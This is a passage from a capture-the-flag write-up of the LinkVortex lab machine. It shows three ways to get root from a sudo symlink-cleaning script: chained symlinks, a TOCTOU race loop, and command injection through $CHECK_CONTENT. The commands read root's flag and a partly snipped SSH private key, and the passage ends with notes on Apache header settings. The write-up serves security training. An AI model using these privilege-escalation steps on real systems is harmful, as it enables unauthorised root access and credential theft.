flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[Shell as bob]-->B(<a href='#double-symlinks'>Double symlinks</a>);
    B-->C(<a href="#ssh-1" >Read root\nSSH key</a>);
    C-->E[Shell as root];
    A-->D(<a href='#toctou'>TOCTOU</a>);
    D-->C;
    A-->F(<a href="#exploit-check_content">Exploit\n$CHECK_CONTENT</a>)
    F-->E;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,3,7,8 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### Double Symlinks

The script gets the content of the link, and makes sure that the target of the link doesn’t have “root” or “etc” in it. What it doesn’t check is if that target is itself is also a symlink. So I can make something like:

```

graph LR
    link1["🔗 a.png"] --> link2["🔗 b"]
    link2 --> rootfile["📄 /root/root.txt"]

```

This will pass the checks, and allow when it tries to `cat a.png`, it will print the flag.

It’s worth noting that [Protected Symlinks](https://sysctl-explorer.net/fs/protected_symlinks/) is enabled here (as is the default on Ubuntu):

```

bob@linkvortex:/$ sysctl fs.protected_symlinks
fs.protected_symlinks = 1

```

This means:

> symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.

This protecting was developed specifically to address Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities (which I’ll show in the next method), but also bites me here if I’m not careful. I need to avoid putting symlinks that I want to follow (like `b` above) in `/tmp`, `/var/tmp`, or `/dev/shm`, etc:

```

bob@linkvortex:/$ find / -type d -perm -0002 -perm -1000 2>/dev/null
/tmp
/tmp/.XIM-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.font-unix
/tmp/.Test-unix
/dev/mqueue
/dev/shm
/run/lock
/var/crash
/var/tmp

```

To exploit this, I’ll create the link `b` from the diagram above:

```

bob@linkvortex:/$ ln -s /root/root.txt /home/bob/.cache/b
bob@linkvortex:/$ ls -l /home/bob/.cache/b
lrwxrwxrwx 1 bob bob 14 Apr  8 20:58 /home/bob/.cache/b -> /root/root.txt

```

Next I’ll create `a.png`, another link pointing to `b`:

```

bob@linkvortex:/$ ln -s /home/bob/.cache/b /home/bob/.cache/a.png
bob@linkvortex:/$ ls -l /home/bob/.cache/a.png
lrwxrwxrwx 1 bob bob 18 Apr  8 20:58 /home/bob/.cache/a.png -> /home/bob/.cache/b

```

Now, with the environment variable to get contents set, I’ll check `a.png`:

```

bob@linkvortex:/$ CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png 
Link found [ /home/bob/.cache/a.png ] , moving it to quarantine
Content:
0a2801b6************************

```

It works.

#### TOCTOU

The intended way to abuse this is with a time-of-check-time-of-use vulnerability. If I can run a command between the time that it checks the target of the link and when it prints the contents of the file, I can change the target of the link.

When the link is checked, it’s in the original location pointing at a dummy non-flagged value. Then if it passes the scan, it is moved to `$QUAR_DIR`, and then the contents are printed. I’ll have a continuous loop looking for the file I want in `$QUAR_DIR` and overwriting it, hoping that I can do so before the contents are read:

```

bob@linkvortex:~$ while true; do ln -sf /root/root.txt /var/quarantined/toctou.png; done

```

`-f` in `ln` will force an overwrite if the file already exists.

Now in another terminal (I can just get another SSH session) I’ll create a link as a `.png`:

```

bob@linkvortex:/$ ln -s /home/bob/.bashrc /dev/shm/toctou.png
bob@linkvortex:/$ ls -l /dev/shm/toctou.png
lrwxrwxrwx 1 bob bob 17 Apr  8 21:04 /dev/shm/toctou.png -> /home/bob/.bashrc

```

When I run the script against this, it will check it, see that it points to bob’s `.bashrc` file, move it, and then print it. If my script runs between the move and the `cat`, it will show `root.txt` instead:

```

bob@linkvortex:/$ CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /dev/shm/toctou.png 
Link found [ /dev/shm/toctou.png ] , moving it to quarantine
Content:
0a2801b6************************

```

It works! In my testing this worked nearly every time.

#### SSH

With either method to read a file, I can also read root’s private SSH key:

```

bob@linkvortex:/$ ln -s /home/bob/.bashrc /dev/shm/toctou.png
bob@linkvortex:/$ CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /dev/shm/toctou.png 
Link found [ /dev/shm/toctou.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
...[snip]...
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----

```

I’ll save a copy locally and connect with `ssh`:

```

oxdf@hacky$ ssh -i ~/keys/linkvortex-root root@linkvortex.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
...[snip]...
root@linkvortex:~#

```

#### Exploit $CHECK\_CONTENT

At this line in the script, the author is expecting `$CHECK_CONTENT` to be either `false` or `true`:

```

    if $CHECK_CONTENT;then

```

However, `false` and `true` are just commands that return 1 and 0 respectively (as shown here by echoing the return code stored in `$?`):

```

bob@linkvortex:~$ false ; echo $?
1
bob@linkvortex:~$ true ; echo $?
0

```

There’s no reason I can’t pass other commands in. I’ll create a symlink:

```

bob@linkvortex:~$ ln -s a.png
bob@linkvortex:~$ ls -l a.png
lrwxrwxrwx 1 bob bob 5 Apr  9 16:37 a.png -> a.png

```

It doesn’t matter what it points to, but it has to be a symlink to get past the check at:

```

if /usr/bin/sudo /usr/bin/test -L $LINK;then

```

Now running with a command as `CHECK_CONTENT` prints the result of that command (and then fails to print the content):

```

bob@linkvortex:~$ CHECK_CONTENT=id sudo bash /opt/ghost/clean_symlink.sh a.png
Link found [ a.png ] , moving it to quarantine
uid=0(root) gid=0(root) groups=0(root)
Content:
/usr/bin/cat: /var/quarantined/a.png: Too many levels of symbolic links

```

I can just run `bash` to get a shell:

```

bob@linkvortex:~$ ln -s a.png
bob@linkvortex:~$ CHECK_CONTENT=bash sudo bash /opt/ghost/clean_symlink.sh a.png
Link found [ a.png ] , moving it to quarantine
root@linkvortex:/home/bob#

```

## Beyond Root - Apache Config

### Overview

I noticed during enumeration that Apache was behaving differently that I typically see it in two places. First, the HTTP `Server` header shows only “Server: Apache”. For Ubuntu 22.04, I would expect “Server: Apache/2.4.52 (Ubuntu)”.

Then the 404 page also lacked information about the server, showing only:

![image-20250408171813308](/img/image-20250408171813308.png)

### Apache Config

There are two Apache directives at play here, `ServerSignature` and `ServerTokens`. These are typically configured in something like a `/etc/apache2/conf-available/security.conf` file (which gets symlinked into `conf-enabled` if enabled), but the author of LinkVortex chose to add them directly to the site configuration in `/etc/apache2/sites-enabled/vhost.conf`:

```

ServerSignature Off
ServerTokens Prod

<VirtualHost *:80>
    ServerName linkvortex.htb
    ServerAlias linkvortex.htb
    ProxyPass / http://127.0.0.1:2368/ upgrade=websocket
    ProxyPassReverse / http://127.0.0.1:2368/
    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^linkvortex.htb$
    RewriteRule ^(.*)$ http://linkvortex.htb$1 [R=permanent,L]
CustomLog /dev/null common
</VirtualHost>

<VirtualHost *:80>
    ServerName dev.linkvortex.htb
    ServerAlias dev.linkvortex.htb
    DocumentRoot /var/www/html
CustomLog /dev/null common
</VirtualHost>

```

The `ServerSignature` directive (according to the [Apache docs](https://httpd.apache.org/docs/2.4/mod/core.html#serversignature)):

> allows the configuration of a trailing footer line under server-generated documents (error messages, `mod_proxy` ftp directory listings, `mod_info` output, …). The reason why you would want to enable such a footer line is that in a chain of proxies, the user often has no possibility to tell which of the chained servers actually produced a returned error message.
>
> The `Off` setting, which is the default, suppresses the footer line. The `On` setting simply adds a line with the server version number and `ServerName` of the serving virtual host, and the `EMail` setting additionally creates a “mailto:” reference to the `ServerAdmin` of the referenced document.
>
> The details of the server version number presented are controlled by the `ServerTokens` directive.

Because this setting is off, the bottom part of the 404 page is suppressed.

The `ServerTokens` directive (according to the [Apache docs](https://httpd.apache.org/docs/2.4/mod/core.html#servertokens)):

> controls whether `Server` response header field which is sent back to clients includes a description of the generic OS-type of the server as well as information about compiled-in modules.
>
> - `ServerTokens Full` (or not specified)
>
>   Server sends (*e.g.*): `Server: Apache/2.4.2 (Unix) PHP/4.2.2 MyMod/1.2`
> - `ServerTokens Prod[uctOnly]`
>
>   Server sends (*e.g.*): `Server: Apache`
> - `ServerTokens Major`
>
>   Server sends (*e.g.*): `Server: Apache/2`
> - `ServerTokens Minor`
>
>   Server sends (*e.g.*): `Server: Apache/2.4`
> - `ServerTokens Min[imal]`
>
>   Server sends (*e.g.*): `Server: Apache/2.4.2`
> - `ServerTokens OS`
>
>   Server sends (*e.g.*): `Server: Apache/2.4.2 (Unix)`
>
> This setting applies to the entire server, and cannot be enabled or disabled on a virtualhost-by-virtualhost basis.
>
> This directive also controls the information presented by the `ServerSignature` directive.

This being on “Prod” is what removes the version in the `Server` header and on the 404 page (if it were shown).

### Modifying

I’ll open this file with `nano /etc/apache2/sites-enabled/vhost.conf` and edit it to comment out the `ServerTokens` directive:

```

ServerSignature Off
#ServerTokens Prod

```

On saving and exiting, I’ll restart Apache (`service apache2 restart`) and take a look. The 404 page is still missing the footer, but the version is back in the HTTP response:

```

HTTP/1.1 404 Not Found
Date: Tue, 08 Apr 2025 21:27:03 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 196
Keep-Alive: timeout=5, max=98
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

```

If I switch them:

```

#ServerSignature Off
ServerTokens Prod 

```

After restarting Apache again, the additional information shows up in the 404:

![image-20250408172621478](/img/image-20250408172621478.png)

It does lack the version, which makes sense since `ServerTokens` does impact this. The HTTP response `Server` header is just back to “Apache”.

If I comment out both (and restart Apache):

```

#ServerSignature Off
#ServerTokens Prod 

```

Then it’s back to showing full info. In the 404 page:

![image-20250408172751818](/img/image-20250408172751818.png)

And in the headers:

```

HTTP/1.1 404 Not Found
Date: Tue, 08 Apr 2025 21:29:53 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 280
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

```